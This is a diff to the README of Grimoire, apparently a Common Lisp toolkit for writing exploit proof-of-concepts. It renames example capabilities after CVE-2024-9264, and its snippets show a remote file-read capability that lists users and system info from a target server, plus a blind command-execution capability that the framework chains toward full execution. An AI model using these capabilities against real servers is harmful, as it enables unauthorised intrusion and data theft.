@@ -13,19 +13,19 @@ It also includes tools to make the implementation of exploit POCs easier.
 To use Grimoire, clone the repository to your local machine.
 
 ```bash
-git clone https://github.com/solanav/grimoire
+$ git clone https://github.com/solanav/grimoire
 ```
 
 After that, launch your common lisp environment (be it Lem, Emacs or any other IDE) and load Grimoire with:
 
 ```lisp
-(ql:quickload :grimoire)
+CL-USER> (ql:quickload :grimoire)
 ```
     
 You should then enter the package and start working on the system itself, rather than using it from another package:
     
 ```lisp
-(in-package :grimoire)
+CL-USER> (in-package :grimoire)
 ```
     
 ## Concepts
@@ -42,10 +42,10 @@ You should then enter the package and start working on the system itself, rather
 
 Once you have Grimoire loaded, you can start using its utilities. First you should find an entry point to the system you are trying to exploit.
 
-If you find a way of reading files in the remote server for example, you can create a function called `my-read-exploit` that reads files from the remote server:
+If you find a way of reading files in the remote server for example, you can create a function called `read-CVE-2024-9264` that reads files from the remote server:
 
 ```lisp
-(define-capability :read my-read-exploit (file)
+(define-capability :read read-CVE-2024-9264 (file)
   (let* ((text (str:replace-all
                 "\\x0A" (fmt "~%")
                 (planning/query
@@ -60,12 +60,12 @@ If you find a way of reading files in the remote server for example, you can cre
 Grimoire now unlocks a bunch of functions that you can use to progress further, for example:
 
 ```lisp
-* (all-users)
+GRIMOIRE> (all-users)
 ("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail"
  "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats"
  "nobody" "_apt" "grafana")
 
-* (system-info)
+GRIMOIRE> (system-info)
 (("PRETTY_NAME" . "Ubuntu 22.04.4 LTS")
  ("NAME" . "Ubuntu") 
  ("VERSION_ID" . "22.04")
@@ -83,18 +83,20 @@ Grimoire now unlocks a bunch of functions that you can use to progress further, 
 If you now create another capability to do blind execution of code:
 
 ```lisp
-(define-capability :blind-exec planning (command)
+(define-capability :blind-exec blind-exec-CVE-2024-9264 (command)
   (send-request-to-vulnerable-server
    (fmt *exploit* command)))
 ```
     
 So now if we check our current capabilities:
 ```lisp
+GRIMOIRE> (capability/list)
 (:READ :BLIND-EXEC)
 ```
     
 Running `derivation/list` will yield:
 ```lisp
+GRIMOIRE> (derivation/list)
 [+] Derivation "LET-THERE-BE-LIGHT"
     Runnable? [YES] (needs :READ, :BLIND-EXEC)
     Needed?   [YES] (provides :EXEC)
